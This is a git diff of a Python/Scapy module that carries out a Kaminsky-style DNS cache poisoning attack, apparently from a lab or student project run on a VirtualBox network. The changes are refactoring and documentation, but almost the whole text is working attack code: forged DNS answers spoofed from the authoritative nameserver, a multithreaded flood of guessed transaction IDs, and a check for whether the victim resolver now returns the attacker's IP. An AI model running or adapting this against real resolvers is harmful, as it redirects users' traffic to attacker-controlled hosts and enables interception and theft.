@@ -1,4 +1,8 @@
-#For packet forging
+## @package DNS_Poisoning
+#
+#   This package includes all function to execute the poisoning attack
+
+
 from scapy import *
 from scapy.all import *
 import scapy.layers.l2
@@ -7,11 +11,21 @@ from multiprocessing.pool import ThreadPool
 import logging
 import threading
 import multiprocessing
+import signal
 
-
+## DNSPoisoning
+#
+#   This class is responsible for the dns poisoning attack
+#
 class DNSPoisoning:
 
-    def __init__(self, victim_server, spoofed_domain, attacker_ip, authoritative_nameserver, initial_id, interrupt_handler=None, log=lambda msg: None):
+    ##  Constructor
+    #
+    #   @param victim_server The IP of the server to attack
+    #   @param attacker_ip The IP of the attacker
+    #
+    def __init__(self, victim_server, spoofed_domain, attacker_ip, authoritative_nameserver,\
+         initial_id, interrupt_handler=None, blessing_terminal=None, log=lambda msg: None):
         self.victim_server = victim_server
         self.spoofed_domain = spoofed_domain
         self.attacker_ip = attacker_ip
@@ -21,32 +35,36 @@ class DNSPoisoning:
         self.auth_nameserver = authoritative_nameserver
         self.flood_pool = None
 
-
+        self.log = log
+        self.t = blessing_terminal
         #Handler of CTRL+C
         self.interrupt_handler = interrupt_handler
 
-
-        self.invalid_url = 'aaa' + str(random.randint(10,1000)) + 'asfd.' + self.spoofed_domain
+        self.invalid_url = 'x' + str(random.randint(10,1000)) + 'x.' + self.spoofed_domain
 
         log("Invalid URL used: " + self.invalid_url)
 
 
+    ##  Send crafted packet
+    #
+    #   @brief This function bla bla bla bla aaaaaa
+    #   @param id_req The TXID to be used
+    #   1) responses should come from the same dest port (53)
+    #   2) Question should match the query section
+    #   3) Query ID should match
+    #
+    # Use Default DNS port as default source port    
+    #
+    # DNS Request:  
+    #   -) ID
+    #   -) Question
+    #   -) 
+    #
+    #
 
     def send_crafted_packet(self, id_req):
+        ##!@brief Send Crafted Packet
 
-        # To generate a valid request we should:
-        # 1) responses should come from the same dest port (53)
-        # 2) Question should match the query section
-        # 3) Query ID should match
-        #
-        # Use Default DNS port as default source port    
-        #
-        # DNS Request:  
-        #   -) ID
-        #   -) Question
-        #   -) 
-        #
-        #
         
         #print("Using ID: " + str(id_req), end='') 
             
@@ -61,7 +79,7 @@ class DNSPoisoning:
         #ancount = number of answer
 
         #TODO: check recursion available
-        crafted_response_1 = IP(dst=victim_server_ip, src=self.auth_nameserver)\
+        crafted_response_1 = IP(dst=self.victim_server, src=self.auth_nameserver)\
             /UDP(dport=53, sport=53)\
                 /DNS(id=id_req,\
                     qr=1,\
@@ -79,7 +97,7 @@ class DNSPoisoning:
                 )
 
         #Second type of attack
-        crafted_response_2 = IP(dst=victim_server_ip, src=self.auth_nameserver)\
+        crafted_response_2 = IP(dst=self.victim_server, src=self.auth_nameserver)\
             /UDP(dport=53, sport=53)\
                 /DNS(id=id_req,\
                     qr=1,\
@@ -119,10 +137,10 @@ class DNSPoisoning:
         #TODO: check max int
         id_range = range(self.id + spacing,self.id + spacing + number_of_guess)
 
-        print("\nUsing ID from {t.bold}{t.blue}{initial}{t.normal} to {t.bold}{t.blue}{final}{t.normal}\n".format(initial=self.id + spacing, final=self.id + spacing + number_of_guess))
+        self.log("\nUsing ID from {t.bold}{t.blue}{initial}{t.normal} to {t.bold}{t.blue}{final}{t.normal}\n".format(initial=self.id + spacing, final=self.id + spacing + number_of_guess, t=self.t))
 
         #Taken from that: https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html 
-        print("Opening socket for faster flood...")
+        self.log("Opening socket for faster flood...")
         self.flood_socket = conf.L3socket(iface='vboxnet0') #TODO: Put this in the parameter
 
         self.flood_pool = ThreadPool(number_of_guess)
@@ -132,7 +150,7 @@ class DNSPoisoning:
 
         self.flood_pool.join()
         self.flood_socket.close()
-        print("Flood finished")
+        self.log("Flood finished")
 
 
 
@@ -141,7 +159,7 @@ class DNSPoisoning:
         # ask the victim for the IP of the domain we are trying to spoof
         try:
             pkt = sr1(IP(dst=self.victim_server) / UDP(sport=53, dport=53) / DNS(qr=0, qd=DNSQR(qname=self.spoofed_domain, qtype='A')), verbose=True, iface='vboxnet0', timeout=10)
-            print("Answer arrived")
+            self.log("Answer arrived")
             if pkt[DNS].an and pkt[DNS].an.rdata:
                 actualAnswer = str(pkt[DNS].an.rdata)
                 # if the IP is our IP, we poisoned the victim
@@ -153,10 +171,10 @@ class DNSPoisoning:
 
 
     def stop_handler(self, sig, frame):
-        print("Closing socket")
+        self.log("Closing socket")
         self.flood_socket.close()
         self.flood_pool.terminate()
-        print("Cache poisoning stopped")
+        self.log("Cache poisoning stopped")
 
         if self.interrupt_handler  != None:     #If an interrupt handler is passed
             signal.signal(signal.SIGINT, self.interrupt_handler)    #Set it as a new SIGINT handler
